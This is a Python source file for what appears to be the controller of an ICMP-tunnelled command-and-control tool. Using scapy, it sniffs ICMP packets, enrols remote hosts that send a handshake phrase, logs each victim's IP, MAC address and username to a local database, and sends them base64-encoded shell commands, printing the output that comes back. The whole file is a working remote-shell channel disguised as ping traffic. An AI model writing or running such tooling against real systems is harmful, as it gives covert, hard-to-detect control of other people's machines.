#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import base64
from shellylib import Host, Target
from tinydb import TinyDB, Query
import os
import time
TTL = int(64)
ICMP_ID = int(12800)

class Controller(Host):
    
    def __init__(self):
        super().__init__()
        self.targets = []
        if os.path.exists('./db.json'):
            os.remove('./db.json')
        self.db = TinyDB('./db.json')
        
    def get_targets(self):
        return self.targets

    def join(self, shellpack):
        match shellpack['message']:
            case "hello how are you":
                
                target = {
                    "id": round(time.time()),
                    "ip": shellpack['ip'],
                    "iface": shellpack['iface'],
                    "mac": shellpack['mac'],
                    "user": shellpack['user'],
                    "status": "STANDBY"
                    }

                self.db.insert(target)
                self.send(target['ip'], "join", "fine thank you")
                
                self.db.update({'status': 'CONNECTED'}, Query().id == target['id'])
                
                self.send(target['ip'], "instruction", "request", base64.b64encode("ls -la".encode()))
            case _:
                print("Invalid join message")
        return

    def instruction(self, shellpack):
        print(f"Instruction Response:\n{base64.b64decode(shellpack['data'].decode()).decode()}")
        
#    def push_to_db(self, target: Target):



if __name__ == "__main__":

    print("[ Setting up controller ]")
    controller = Controller()
    print(controller)

    print("[ Starting sniffer ]")
    print("[ Shellpack log ]")
    sniff(iface=controller.iface, filter="icmp", prn=controller.sniff_callback, store="0")
